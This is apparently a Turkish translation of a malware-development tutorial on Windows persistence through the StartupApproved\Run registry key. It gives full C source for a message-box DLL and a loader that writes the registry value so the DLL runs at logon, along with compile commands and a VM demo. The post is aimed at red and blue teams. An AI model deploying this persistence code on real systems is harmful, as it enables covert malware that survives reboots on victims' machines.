\newpage
\subsection{90. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 24. StartupApproved. Basit C örneği.}

﷽

![pers](./images/117/2024-03-15_01-04.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımlarda kalıcılık sağlamak için kullanılabilecek bir başka ilginç yöntem olan **StartupApproved** Küyük Defteri anahtarına dayanmaktadır.    

### StartupApproved

Kalıcılık konusundaki bu serinin ilk gönderisinde, en popüler ve klasik yöntemlerden biri olan [Registry Run anahtarları](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html) üzerinden kalıcılık sağlama tekniğini ele alışmıştım.      

Ancak daha az bilinen ve "startup" sürecinde (örneğin, Windows Explorer tarafından kontrol edilen `Run` ve `RunOnce` anahtarları, Startup klasörü vb.) kullanılan bir diğer Küyük Defteri kaydı vardır. `userinit.exe` tamamlandıktan sonra aşağıdaki Küyük Defteri konumunda bulunur:    

```bash
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
```

Görünüyor ki, bu anahtar **Windows Görev Yöneticisi'nin** `Startup` sekmesi aracılığıyla girişlerin etkinleştirildiği veya devre dışı bırakıldığında dolmaktadır:     

![pers](./images/117/2024-03-15_00-47.png){width="80%"}    

Güzel haber şu ki, bu Küyük Defteri yolunu kalıcılık için kullanabiliriz.     

### pratik örnek

Öncelikle, aşağıdaki komutu kullanarak Küyük Defteri anahtarlarını kontrol edin:    

```powershell
reg query 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"
 /s
```

![pers](./images/117/2024-03-14_23-57_1.png){width="80%"}    

Bir sonraki adımda, her zamanki gibi, "kötü" uygulamamızı oluşturalım (`hack.c`):     

```cpp
/*
hack.c
basit DLL messagebox
yazar: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow-meow!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Her zamanki gibi, sadece `meow-meow` mesaj kutusu.      

Ardından, `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved` kaydını değiştiriyoruz (`pers.c`):     

```cpp
/*
pers.c
Windows kalıcılık
StartupApproved aracılığıyla
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00};

  const char* path = 
  "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\
  StartupApproved\\Run";
  const char* evil = "Z:\\2024-03-12-malware-pers-24\\hack.dll";

  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE, 
  &hkey);
  printf (res != ERROR_SUCCESS ? "Küyük Defteri anahtarı açılamadı :(" : 
  "Küyük Defteri anahtarı başarıyla açıldı :)");

  res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
  printf(res != ERROR_SUCCESS ? "Küyük Defteri değeri ayarlanamadı :(" : 
  "Küyük Defteri değeri başarıyla ayarlandı :)");

  // Küyük Defteri anahtarını kapat
  RegCloseKey(hkey);

  return 0;
}
```

Görebildiğiniz gibi, Proof of Concept (PoC) mantığı oldukça basittir - Küyük Defteri kaydının değerini `0x02 0x00...` ikili (binary) değerine ayarlıyoruz.      

### demo

Haydi her şeyi adım adım inceleyelim. Öncelikle, "kötü amaçlı yazılım" DLL dosyamızı derleyelim:      

```bash
x86_64-w64-mingw32-g++ -shared -o hack.dll hack.c -fpermissive
```

![pers](./images/117/2024-03-14_21-50.png){width="80%"}    

Ardından, Proof of Concept (PoC) kodumuzu derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/117/2024-03-14_21-51.png){width="80%"}    

Son olarak, bunu hedef sistemde çalıştıralım. Benim durumumda, `Windows 10 x64 v1903` VM görünümü şu şekilde oldu:     

```powershell
.\pers.exe
```

![pers](./images/117/2024-03-15_00-46.png){width="80%"}    

Ayrıca, Küyük Defteri kaydını tekrar kontrol ettim:     

```powershell
reg query 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved" 
/s
```

![pers](./images/117/2024-03-15_00-46_1.png){width="80%"}    

Ardından, oturumu kapatıp tekrar girdim:     

![pers](./images/117/2024-03-15_00-50.png){width="80%"}    

![pers](./images/117/2024-03-15_00-51.png){width="80%"}    

Ancak beklendiği gibi çalışmadı...    

Bu nedenle, girdinin adını güncelledim:     

![pers](./images/117/2024-03-15_00-54.png){width="80%"}    

Tekrar oturumu kapatıp açtım, biraz bekledim... ve mükemmel çalıştı!    

![pers](./images/117/2024-03-15_01-03.png){width="80%"}    

![pers](./images/117/2024-03-15_01-04.png){width="80%"}    

Bu nedenle betik içerisinde bir satırı güncelledim:    

```cpp
const char* evil = "C:\\temp\\hack.dll";
```

Ancak bir uyarı yapmalıyım. Test ettiğim bazı durumlarda, bu yöntem Skype gibi programların otomatik olarak başlatılmasına neden oldu:     

![pers](./images/117/2024-03-14_23-56.png){width="80%"}    

![pers](./images/117/2024-03-14_23-57.png){width="80%"}    

Görebildiğiniz gibi, her şey beklendiği gibi mükemmel çalıştı! =^..^= :)    

Bu teknik, [APT28](https://attack.mitre.org/groups/G0007/), [APT29](https://attack.mitre.org/groups/G0016/), [Kimsuky](https://attack.mitre.org/groups/G0094/) ve [APT33](https://attack.mitre.org/groups/G0064/) gibi APT grupları tarafından aktif olarak kullanılmaktadır. Gerçekte, bu yöntem kurbanları kandırmak için son derece kullanışlı olduğundan yaygın olarak tercih edilmektedir.     

Umarım bu gönderi, mavi takım üyelerinin bu teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.      

[ATT&CK MITRE: T1547.001](https://attack.mitre.org/techniques/T1547/001/)     
[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[APT28](https://attack.mitre.org/groups/G0007/)    
[APT29](https://attack.mitre.org/groups/G0016/)     
[Kimsuky](https://attack.mitre.org/groups/G0094/)    
[APT33](https://attack.mitre.org/groups/G0064/)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-03-12-malware-pers-24)     
